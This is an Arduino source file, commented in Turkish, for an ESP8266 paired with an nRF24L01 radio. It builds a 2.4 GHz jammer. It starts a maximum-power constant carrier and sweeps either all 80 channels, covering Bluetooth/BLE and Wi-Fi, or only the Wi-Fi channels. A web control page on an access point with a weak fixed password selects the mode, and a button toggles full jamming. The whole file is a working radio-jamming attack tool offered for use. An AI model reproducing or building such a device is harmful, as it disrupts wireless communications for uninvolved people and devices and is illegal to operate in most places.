#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <SPI.h>
#include <RF24.h>

// nRF24L01 pinleri
RF24 radio(D4, D8); // CE, CSN

ESP8266WebServer server(80);

// Dahili LED
const int ledPin = LED_BUILTIN;

// Buton = D2 (GPIO4)
const int buttonPin = D2;

bool fullJammerActive = false;
uint8_t attack_type = 2;

// Debounce
unsigned long lastButtonRead = 0;
bool lastButtonState = HIGH;
bool stableState = HIGH;
unsigned long debounceTime = 40;

// LED blink
unsigned long lastBlink = 0;
int ledState = LOW;

const int wifiFrequencies[] = {
  2412,2417,2422,2427,2432,
  2437,2442,2447,2452,2457,2462
};

String htmlPage() {
    String page = "<html><head><title>ESP8266 Jammer</title></head><body style='font-family:sans-serif;text-align:center;'>";
    page += "<h1>ESP8266 + nRF24L01 Jammer</h1>";
    page += "<p>Aktif Mod: " + String((attack_type==0)?"BLE & All 2.4GHz":(attack_type==1)?"Just Wi-Fi":"Idle") + "</p>";
    page += "<p>Buton Durumu: " + String(fullJammerActive?"Full Jammer AÇIK":"Full Jammer KAPALI") + "</p>";
    page += "<form action='/set' method='GET'>";
    page += "<button name='mode' value='0'>BLE & All 2.4GHz</button><br><br>";
    page += "<button name='mode' value='1'>Just Wi-Fi</button><br><br>";
    page += "<button name='mode' value='2'>Idle</button>";
    page += "</form></body></html>";
    return page;
}

void handleRoot() {
    server.send(200, "text/html", htmlPage());
}

void handleSet() {
    if (server.hasArg("mode")) {
        attack_type = server.arg("mode").toInt();
    }
    server.sendHeader("Location", "/");
    server.send(303);
}

void fullAttack() {
    for (uint8_t i = 0; i < 80; i++) radio.setChannel(i);
}

void wifiAttack() {
    for (uint8_t i=0; i<11; i++) radio.setChannel(wifiFrequencies[i] - 2400);
}

void setup() {
    Serial.begin(9600);

    pinMode(ledPin, OUTPUT);
    digitalWrite(ledPin, HIGH);

    pinMode(buttonPin, INPUT_PULLUP);

    if (!radio.begin()) {
        Serial.println("RF24 baslatilamadi!");
        while(1);
    }

    radio.setAutoAck(false);
    radio.stopListening();
    radio.setPayloadSize(5);
    radio.setAddressWidth(3);
    radio.setPALevel(RF24_PA_MAX);
    radio.setDataRate(RF24_2MBPS);
    radio.setCRCLength(RF24_CRC_DISABLED);
    radio.startConstCarrier(RF24_PA_MAX, 45);

    WiFi.softAP("ESP_Jammer", "12345678");
    server.on("/", handleRoot);
    server.on("/set", handleSet);
    server.begin();
}

void loop() {
    server.handleClient();

    // -----------------------------
    //   YÜKSEK GÜVENLİKLİ DEBOUNCE
    // -----------------------------
    bool reading = digitalRead(buttonPin);

    if (reading != lastButtonState) {
        lastButtonRead = millis();
    }

    if ((millis() - lastButtonRead) > debounceTime) {
        if (reading != stableState) {
            stableState = reading;

            if (stableState == LOW) {
                fullJammerActive = !fullJammerActive;
                attack_type = fullJammerActive ? 0 : 2;
                Serial.println(fullJammerActive ? "Full Jammer AÇIK" : "Full Jammer KAPALI");
            }
        }
    }

    lastButtonState = reading;


    // -----------------------------
    // LED hızlı blink (attack aktifken)
    // -----------------------------
    if (attack_type == 0 || attack_type == 1) {
        if (millis() - lastBlink >= 80) {
            lastBlink = millis();
            ledState = !ledState;
            digitalWrite(ledPin, ledState);
        }
    } else {
        digitalWrite(ledPin, HIGH); // OFF
    }


    // -----------------------------
    // Attack Mode
    // -----------------------------
    switch (attack_type) {
        case 0: fullAttack(); break;
        case 1: wifiAttack(); break;
        case 2: break;
    }
}
